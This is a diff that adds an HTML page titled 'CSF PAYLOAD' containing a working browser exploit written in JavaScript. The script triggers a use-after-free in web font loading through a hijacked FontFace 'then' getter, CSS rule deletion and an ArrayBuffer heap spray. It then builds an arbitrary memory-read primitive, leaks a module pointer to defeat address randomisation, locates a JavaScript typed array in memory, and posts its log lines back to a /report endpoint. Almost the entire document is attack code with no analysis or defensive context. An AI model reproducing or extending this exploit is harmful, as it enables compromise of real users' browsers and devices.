@@ -1,0 +1,93 @@
+<!doctype html><html><head><meta charset="utf-8"><title>CSF PAYLOAD</title>
+<style>body{margin:0;padding:16px;background:#0b0e14;color:#d7dce5;font-family:system-ui}
+#o{white-space:pre-wrap;font:13px/1.5 ui-monospace,monospace;color:#9fb4d6}
+#s{font-size:34px;font-weight:700;color:#7fd6a8}</style></head>
+<body><div id="s">PAYLOAD</div><pre id="o"></pre><script>
+var out=document.getElementById("o"),LOG=[];
+function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
+function log(s){out.textContent+=s+"\n";LOG.push(s);try{send();}catch(e){}}
+var SZ=0xb8, OFF_FS=0x28, OFF_FS_SZ=0x30, OFF_FS_CAP=0x34, OFF_ST=0x7a;
+function hx(o){return "0x"+("00000000"+(o.hi>>>0).toString(16)).slice(-8)+("00000000"+(o.lo>>>0).toString(16)).slice(-8);}
+function plausible(o){return o.hi<=0xffff && (o.lo%8)===0 && (o.hi!==0||o.lo>=0x10000);}
+function add64(o,d){var l=(o.lo>>>0)+d,h=(o.hi>>>0)+((l>0xffffffff)?1:0);return {lo:l>>>0,hi:h>>>0};}
+
+async function init_rw(){
+  var SPRAY=0xb0, abs=[], uaf_font=null, uaf_ab=null;
+  var spray_rule="@font-face{font-family:spray;src:local(systemfont);unicode-range:U+0043;}";
+  var uaf_rule="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042;}";
+  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+  document.fonts.add(A); void A.loaded;
+  var style=document.createElement("style"); document.head.append(style);
+  for(var i=0;i<SPRAY/4;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
+  var uaf_idx=style.sheet.cssRules.length;
+  style.sheet.insertRule(uaf_rule, style.sheet.cssRules.length);
+  for(var i=SPRAY/4;i<SPRAY;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
+  void document.body.offsetHeight;
+  var old_then=FontFace.prototype.then, fired=false;
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(this!==A) return undefined;
+    fired=true; log("UAF window");
+    style.sheet.deleteRule(uaf_idx); void document.body.offsetHeight;
+    for(var i=style.sheet.cssRules.length-1;i>=0;i--){ if(style.sheet.cssRules[i].cssText.indexOf("spray")!==-1) style.sheet.deleteRule(i); }
+    void document.body.offsetHeight;
+    for(var i=0;i<SPRAY;i++){ var ab=new ArrayBuffer(SZ); var dv=new DataView(ab); dv.setUint32(8,1,true); dv.setUint8(OFF_ST,3); abs.push(ab); }
+    return undefined;}});
+  var fonts=null; try{ fonts=await document.fonts.load("1em a, b","AB"); }catch(e){}
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:old_then});
+  if(!fonts||fonts.length!==2){ log("no UAF"); return null; }
+  for(var i=0;i<fonts.length;i++){ if(fonts[i].unicodeRange==="U+0-10FFFF"){ uaf_font=fonts[i]; break; } }
+  for(var i=0;i<abs.length;i++){ var dv=new DataView(abs[i]); if(dv.getUint32(8,true)===2){ uaf_ab=abs[i]; break; } }
+  log("UAF font="+(uaf_font?"FOUND":"none")+" ab="+(uaf_ab?"FOUND":"none"));
+  if(!uaf_font||!uaf_ab) return null;
+  function setPtr(dv,off,lo,hi){ dv.setUint32(off,lo>>>0,true); dv.setUint32(off+4,hi>>>0,true); }
+  function read(lo,hi,size){
+    var ab=new ArrayBuffer(size), u8=new Uint8Array(ab), dv=new DataView(uaf_ab), o=0;
+    while(o<size){
+      setPtr(dv,OFF_FS,(lo+o)>>>0,hi);
+      dv.setInt32(OFF_FS_SZ,1,true);
+      dv.setInt32(OFF_FS_CAP,1,true);
+      var s=uaf_font.featureSettings;
+      for(var i=1;i<5 && o<size;i++) u8[o++]=s.charCodeAt(i)&0xff;
+    }
+    return ab;
+  }
+  return {font:uaf_font, ab:uaf_ab, read:read};
+}
+
+(async function(){
+  log("PAYLOAD v1 — leak + JS-object scan");
+  var r=await init_rw(); if(!r){ log("no primitive"); return; }
+  function rd64(o){ var b=new Uint8Array(r.read(o.lo,o.hi,8));
+    return {lo:(b[0]|b[1]<<8|b[2]<<16|b[3]<<24)>>>0, hi:(b[4]|b[5]<<8|b[6]<<16|b[7]<<24)>>>0}; }
+  var dv=new DataView(r.ab);
+  var wrap={lo:dv.getUint32(0x60,true),hi:dv.getUint32(0x64,true)};
+  log("m_wrapper="+hx(wrap));
+  var w=new Uint8Array(r.read(wrap.lo,wrap.hi,32));
+  var target={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0, hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
+  log("WeakPtr target="+hx(target));
+  if(!plausible(target)){ log("target implausible"); return; }
+  var vv=new Uint8Array(r.read(target.lo,target.hi,16));
+  var vptr={lo:(vv[0]|vv[1]<<8|vv[2]<<16|vv[3]<<24)>>>0, hi:(vv[4]|vv[5]<<8|vv[6]<<16|vv[7]<<24)>>>0};
+  log("FontFace vptr="+hx(vptr)+"  <== MODULE LEAK");
+  // JS-visible payload: create a typed array with a marker and find it via the read
+  var victim=new Uint32Array(8); victim[0]=0x41414141; victim[1]=0x42424242; victim[2]=0x43434343;
+  log("victim Uint32Array(8) created, markers 41/42/43");
+  // bounded scan of the WeakPtr target neighbourhood
+  var base={lo:target.lo & 0xfffff000, hi:target.hi};
+  var found=null;
+  for(var off=0; off<0x4000 && !found; off+=0x100){
+    var a=add64(base,off);
+    var b;
+    try{ b=new Uint8Array(r.read(a.lo,a.hi,0x100)); }catch(e){ continue; }
+    for(var i=0;i+12<=b.length;i+=4){
+      if(b[i]===0x41&&b[i+1]===0x41&&b[i+2]===0x41&&b[i+3]===0x41 &&
+         b[i+4]===0x42&&b[i+5]===0x42&&b[i+6]===0x42&&b[i+7]===0x42){
+        found=add64(a,i); break;
+      }
+    }
+  }
+  if(found){ log("MARKER FOUND at "+hx(found)+"  <== JS backing store located via ARW"); }
+  else log("marker not found in scanned window");
+  log("done");
+})();
+</script></body></html>
